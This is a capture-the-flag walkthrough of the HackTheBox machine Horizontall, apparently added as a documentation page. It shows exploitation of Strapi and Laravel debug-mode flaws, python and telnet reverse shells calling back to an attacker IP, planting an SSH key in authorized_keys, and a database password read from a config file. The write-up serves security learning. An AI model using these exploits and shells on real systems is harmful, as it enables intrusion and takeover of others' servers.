@@ -1,0 +1,656 @@
+---
+title: 'HackTheBox Horizontall'
+description: 'Linux machine walkthrough from enumeration to privilege escalation.'
+icon: 'shield-halved'
+---
+
+# Enumeration
+
+## Run Nmap Scan
+
+```bash
+nmap -p- -T4 10.129.76.28
+
+"
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-23 11:43 BST
+Nmap scan report for 10.129.76.28
+Host is up (0.16s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 470.15 seconds
+"
+```
+
+```bash
+nmap -p 22,80 -sC -sV 10.129.76.28
+
+"
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-23 11:51 BST
+Nmap scan report for 10.129.76.28
+Host is up (0.16s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
+|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
+|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.18 seconds
+"
+```
+
+## Update Hostname
+
+```bash
+sudo vi /etc/hosts
+
+"
+10.129.76.28 horizontall.htb
+"
+```
+
+## **View Website**
+
+![Untitled](./images/horizontall/untitled.png)
+
+## Directory Bruteforcing (Run Gobuster)
+
+```bash
+gobuster dir -u http://horizontall.htb/ -w /usr/share/wordlists/dirb/common.txt 
+
+"
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://horizontall.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2023/10/23 11:56:40 Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
+/favicon.ico          (Status: 200) [Size: 4286]                                 
+/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
+/index.html           (Status: 200) [Size: 901]                                  
+/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/] 
+                                                                                 
+===============================================================
+2023/10/23 11:57:59 Finished
+===============================================================
+"
+```
+
+## Enumerating Subdomain Information
+
+### Subdomain Bruteforcing (Failed)
+
+```bash
+wfuzz -u http://horizontall.htb -H "Host: FUZZ.horizontall.htb" -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hh 194
+
+`
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://horizontall.htb/
+Total requests: 19983
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload        
+=====================================================================
+
+000000001:   200        1 L      43 W       901 Ch      "www"          
+000001176:   200        1 L      43 W       901 Ch      "WWW"          
+
+Total time: 0
+Processed Requests: 19983
+Filtered Requests: 19981
+Requests/sec.: 0
+`
+```
+
+No subdomain is found through bruteforcing
+
+### Inspecting Website Code
+
+![Untitled](./images/horizontall/untitled-1.png)
+
+Opening network tab, we can find 2 `.js` files. We are going to inspect the `app` file, so we can get any additional information.
+
+```bash
+wget http://horizontall.htb/app.c68eb462.js
+```
+
+Download the file and install the file extension for vscode to format the minified js code
+
+[](https://open-vsx.org/vscode/item?itemName=lonefy.vscode-JS-CSS-HTML-formatter)
+
+```jsx
+y = {
+    name: "App",
+    components: {
+        Navbar: v,
+        Home: w
+    },
+    data: function() {
+        return {
+            reviews: []
+        }
+    },
+    methods: {
+        getReviews: function() {
+            var t = this;
+            r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
+                return t.reviews = s.data
+            }))
+        }
+    }
+}
+//# sourceMappingURL=app.c68eb462.js.map
+```
+
+Below is the extracted information we found from the js code. 
+
+We found the link `http://api-prod.horizontall.htb/reviews` that we can enumerate.
+
+### Update Hostname
+
+```bash
+sudo vi /etc/hosts
+
+"
+10.129.76.28 horizontall.htb api-prod.horizontall.htb
+"
+```
+
+`api-prod.horizontall.htb` was included in the hostname
+
+## api-prod website directory bruteforcing (Run Gobuster)
+
+```bash
+gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
+
+"
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://api-prod.horizontall.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2023/10/23 14:24:42 Starting gobuster in directory enumeration mode
+===============================================================
+/reviews              (Status: 200) [Size: 507]
+/users                (Status: 403) [Size: 60] 
+/admin                (Status: 200) [Size: 854]
+Progress: 48055 / 207644 (23.14%)             ^C
+[!] Keyboard interrupt detected, terminating.
+                                               
+===============================================================
+2023/10/23 14:38:52 Finished
+===============================================================
+"
+```
+
+# Exploitation
+
+## Strapi Enumeration
+
+![Untitled](./images/horizontall/untitled-2.png)
+
+If we route to `/admin` , we get this login page.
+
+[Strapi - Open source Node.js Headless CMS 🚀](https://strapi.io/)
+
+It’s a CMS application built in node js.
+
+### Finding Exploit
+
+```bash
+searchsploit strapi
+
+"
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Strapi 3.0.0-beta - Set Password (Unauthentic | multiple/webapps/50237.py
+Strapi 3.0.0-beta.17.7 - Remote Code Executio | multiple/webapps/50238.py
+Strapi CMS 3.0.0-beta.17.4 - Remote Code Exec | multiple/webapps/50239.py
+Strapi CMS 3.0.0-beta.17.4 - Set Password (Un | nodejs/webapps/50716.rb
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+"
+```
+
+If `strapi` version is either 17.4 or 17.7, we could exploit this vulnerability.
+
+### Finding version no.
+
+![Untitled](./images/horizontall/untitled-3.png)
+
+I was searching either 17.4 or 17.7 as those had the vulnerability I could exploit. Here the version is `beta.17.4`
+
+## Using C**VE-2019-19609**
+
+```bash
+searchsploit -x 50239
+
+"
+  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
+      URL: https://www.exploit-db.com/exploits/50239
+     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py
+    Codes: N/A
+ Verified: False
+File Type: Python script, ASCII text executable
+"
+```
+
+## Exploit
+
+```bash
+python3 50239.py http://api-prod.horizontall.htb/
+
+"
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
+
+[+] Password reset was successfully
+[+] Your email is: admin@horizontall.htb
+[+] Your new credentials are: admin:SuperStrongPassword1
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjk4MDY4ODQ0LCJleHAiOjE3MDA2NjA4NDR9.iFT5R6EqwltubwuU4hYBobSfCrCo0MmBLdV_kpyOIRM
+
+$>
+"
+```
+
+### Using Python Reverse Shell (Failed)
+
+First I’m going to check if the target system has python installed
+
+```bash
+python3 --version | nc 10.10.14.64 4444
+
+`
+$> python3 --version | nc 10.10.14.64 4444
+[+] Triggering Remote code executin
+[*] Rember this is a blind RCE don't expect to see output
+{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
+$>
+`
+```
+
+```bash
+nc -lvnp 4444
+
+"
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.129.76.28.
+Ncat: Connection from 10.129.76.28:38990.
+Python 3.6.9
+"
+```
+
+Generate Python Reverse Shell
+
+[Online - Reverse Shell Generator](https://www.revshells.com/)
+
+```bash
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.64",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+`
+[+] Triggering Remote code executin
+[*] Rember this is a blind RCE don't expect to see output
+{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
+`
+```
+
+Unfortunately the Reverse Shell didn’t work.
+
+### Using Telnet Reverse Shell
+
+```bash
+TF=$(mktemp -u);mkfifo $TF && telnet 10.10.14.64 4444 0<$TF | sh 1>$TF
+
+"
+$> TF=$(mktemp -u);mkfifo $TF && telnet 10.10.14.64 4444 0<$TF | sh 1>$TF
+[+] Triggering Remote code executin
+[*] Rember this is a blind RCE don't expect to see output
+"
+```
+
+```bash
+nc -lvnp 4444
+
+`
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.129.76.28.
+Ncat: Connection from 10.129.76.28:39012.
+
+whoami
+strapi
+python -c 'import pty;pty.spawn("/bin/bash")'
+strapi@horizontall:~/myapi$
+`
+```
+
+# Privilege Escalation
+
+## Finding Credentials from MySQL Configuration File (Failed)
+
+```bash
+cat database.json
+
+`
+~/myapi/config/environments/development$ cat database.json
+
+{
+  "defaultConnection": "default",
+  "connections": {
+    "default": {
+      "connector": "strapi-hook-bookshelf",
+      "settings": {
+        "client": "mysql",
+        "database": "strapi",
+        "host": "127.0.0.1",
+        "port": 3306,
+        "username": "developer",
+        "password": "#J!:F9Zt2u"
+      },
+      "options": {}
+    }
+  }
+}
+`
+```
+
+After enumerating the filesystem, I found the credentials from the configuration file.
+
+```bash
+su - developer
+
+"
+Password: #J!:F9Zt2u
+
+su: Authentication failure
+"
+```
+
+Unfortunately, the credential didn’t work to escalate the privilege to developer.
+
+## Enumerating Network Information
+
+```bash
+netstat -lntp
+
+"
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1938/node /usr/bin/ 
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+"
+```
+
+We know 22,80 is the port that we already scanned and port 1337 is the port for the strapi application. But we haven’t enumerated port 8000.
+
+However, looking at the ip address, it’s hosted in localhost. So we need to forward the port.
+
+## Port Forwarding using SSH
+
+### Checking SSH config in the target system
+
+```bash
+cat sshd_config 
+
+"
+# Expect .ssh/authorized_keys2 to be disregarded by default in future.
+#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2
+"
+```
+
+The key file should be in `.ssh/authorized_keys` path. Meaning in `~/.ssh/authorized_keys` path.
+
+### Generating SSH Key
+
+```bash
+ssh-keygen -t ed25519
+```
+
+Generate the SSH key from our PC and host the generated `id_ed25519.pub` file (SSH public key).
+
+### Download the public key inside the Specified PATH
+
+```bash
+# ~/.ssh/authorized_keys
+cd ~
+mkdir .ssh
+cd .ssh
+curl http://<attacker ip>:8000/id_ed25519.pub -o authorization_keys
+```
+
+### Port Forward 8000 to Our System.
+
+```bash
+ssh -i id_ed25519 strapi@10.129.76.163 -L 8000:localhost:8000
+
+"
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Oct 24 10:34:46 UTC 2023
+
+  System load:  0.0               Processes:           197
+  Usage of /:   82.0% of 4.85GB   Users logged in:     0
+  Memory usage: 29%               IP address for eth0: 10.129.76.163
+  Swap usage:   0%
+
+0 updates can be applied immediately.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
+$
+"
+```
+
+## Enumerating Localhost:8000
+
+![Untitled](./images/horizontall/untitled-4.png)
+
+It is a the default laravel (web application) server hosted. 
+
+### localhost:8000 directory bruteforcing (Run Gobuster)
+
+```bash
+gobuster dir -u http://localhost:8000/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -z -x php -f
+
+`
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://localhost:8000/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2023/10/24 11:37:26 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 17473]
+[ERROR] 2023/10/24 11:37:56 [!] Get "http://localhost:8000/55.php": read tcp [::1]:42738->[::1]:8000: read: connection reset by peer
+[ERROR] 2023/10/24 11:37:56 [!] Get "http://localhost:8000/topic.php": read tcp [::1]:42772->[::1]:8000: read: connection reset by peer
+[ERROR] 2023/10/24 11:37:56 [!] Get "http://localhost:8000/g.php": EOF
+[ERROR] 2023/10/24 11:37:56 [!] Get "http://localhost:8000/multimedia.php": EOF
+[ERROR] 2023/10/24 11:37:56 [!] Get "http://localhost:8000/start.php": EOF
+[ERROR] 2023/10/24 11:37:56 [!] Get "http://localhost:8000/lists/": EOF
+[ERROR] 2023/10/24 11:37:56 [!] Get "http://localhost:8000/title/": read tcp [::1]:42766->[::1]:8000: read: connection reset by peer
+...
+`
+```
+
+SSH Port forwarding to port 8000 fails during the gobuster scan to localhost:8000, which results in fail in transmitting packet.
+
+```bash
+gobuster dir -u http://localhost:8000/ -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -z
+
+`
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://localhost:8000/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2023/10/24 11:44:14 Starting gobuster in directory enumeration mode
+===============================================================
+/profiles             (Status: 500) [Size: 616210]
+[ERROR] 2023/10/24 11:44:57 [!] Get "http://localhost:8000/locations": EOF
+[ERROR] 2023/10/24 11:44:57 [!] Get "http://localhost:8000/property": read tcp [::1]:39210->[::1]:8000: read: connection reset by peer
+[ERROR] 2023/10/24 11:44:57 [!] Get "http://localhost:8000/talk": read tcp [::1]:39218->[::1]:8000: read: connection reset by peer
+[ERROR] 2023/10/24 11:44:57 [!] Get "http://localhost:8000/third-party": read tcp [::1]:39232->[::1]:8000: read: connection reset by peer
+[ERROR] 2023/10/24 11:44:57 [!] Get "http://localhost:8000/phplist": EOF
+`
+```
+
+I got a hint from [0xdf-Horizontall](https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html#shell-as-root) for which web directory list file to use.
+
+## Exploiting the Vulnerability
+
+![Untitled](./images/horizontall/untitled-5.png)
+
+Going to `/profiles` , here we can see an error occured and know this is a debug menu.
+
+Finding Laravel debug mode exploit in google, I found an interesting website.
+
+[Laravel <= v8.4.2 debug mode: Remote code execution](https://www.ambionics.io/blog/laravel-debug-rce)
+
+It requires version less than `8.4.2` which can be used to exploit our target system as the target system is using Laravel v8. (Look closely in the Laravel default website)
+
+### Generating a Reverse Shell
+
+[Online - Reverse Shell Generator](https://www.revshells.com/)
+
+```bash
+vi reverse.sh
+
+`
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.64",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+`
+```
+
+I’m going to use a python reverse shell, since I know python3.6.9 is installed.
+
+Download the reverse shell inside the `/tmp` folder using `wget` and give execution permission using `chmod +x reverse.sh`
+
+### Using CVE-2021-3129
+
+[https://github.com/nth347/CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit)
+
+Execute the exploit in our machine, but don’t forget to maintain the SSH Port Forwarding connection.
+
+```bash
+./exploit.py http://localhost:8000 Monolog/RCE1 "uname -a"
+
+"
+[i] Trying to clear logs
+[+] Logs cleared
+[i] PHPGGC not found. Cloning it
+Cloning into 'phpggc'...
+remote: Enumerating objects: 3891, done.
+remote: Counting objects: 100% (744/744), done.
+remote: Compressing objects: 100% (264/264), done.
+remote: Total 3891 (delta 536), reused 528 (delta 467), pack-reused 3147
+Receiving objects: 100% (3891/3891), 549.91 KiB | 1.98 MiB/s, done.
+Resolving deltas: 100% (1693/1693), done.
+[+] Successfully converted logs to PHAR
+[+] PHAR deserialized. Exploited
+
+Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+
+[i] Trying to clear logs
+[+] Logs cleared
+"
+```
+
+### Listen to Reverse Shell and Exploit
+
+```bash
+./exploit.py http://localhost:8000 Monolog/RCE1 "/bin/bash /tmp/reverse.sh"
+
+"
+[i] Trying to clear logs
+[+] Logs cleared
+[+] PHPGGC found. Generating payload and deploy it to the target
+[+] Successfully converted logs to PHAR
+[i] There is no output
+[i] Trying to clear logs
+"
+```
+
+```bash
+nc -lvnp 4445
+
+"
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::4445
+Ncat: Listening on 0.0.0.0:4445
+Ncat: Connection from 10.129.76.163.
+Ncat: Connection from 10.129.76.163:54180.
+# whoami
+whoami
+root
+#
+"
+```
+
+# References
+
+- [https://docs-v3.strapi.io/developer-docs/latest/setup-deployment-guides/configurations.html#required-configurations](https://docs-v3.strapi.io/developer-docs/latest/setup-deployment-guides/configurations.html#required-configurations)
+- [https://www.ibm.com/docs/en/ioc/1.6.0?topic=servers-updating-ssh-configuration](https://www.ibm.com/docs/en/ioc/1.6.0?topic=servers-updating-ssh-configuration)
+- [https://unix.stackexchange.com/questions/36540/why-am-i-still-getting-a-password-prompt-with-ssh-with-public-key-authentication](https://unix.stackexchange.com/questions/36540/why-am-i-still-getting-a-password-prompt-with-ssh-with-public-key-authentication)
+- [https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html#shell-as-root](https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html#shell-as-root)
+- [https://www.ambionics.io/blog/laravel-debug-rce](https://www.ambionics.io/blog/laravel-debug-rce)
+- [https://github.com/nth347/CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit)
